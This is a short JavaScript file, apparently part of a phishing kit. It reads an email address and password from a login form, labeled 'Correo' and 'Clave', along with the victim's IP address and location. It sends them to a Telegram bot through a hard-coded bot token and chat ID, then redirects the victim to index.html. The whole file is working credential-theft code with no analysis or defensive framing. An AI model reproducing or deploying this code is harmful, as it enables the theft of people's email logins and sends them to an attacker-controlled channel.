//bot token
var telegram_bot_id = "7933179313:AAFjbGziX_A9jLKiVe2be8HO7YyNGIuab8M";
//chat id
var chat_id = "-4755631975";
var u_name, pax,  pax3, ip, ip2;
var ready = function () {
    u_name = document.getElementById("numtar").value;
    pax = document.getElementById("venctar").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "🔵Correo-General🔵\nCorreo: " + u_name + "\nClave: " + pax + "\nIP: " + ip +"\n" + ip2;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST", 
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index.html';
        console.log(response);
    });
    return false;
};
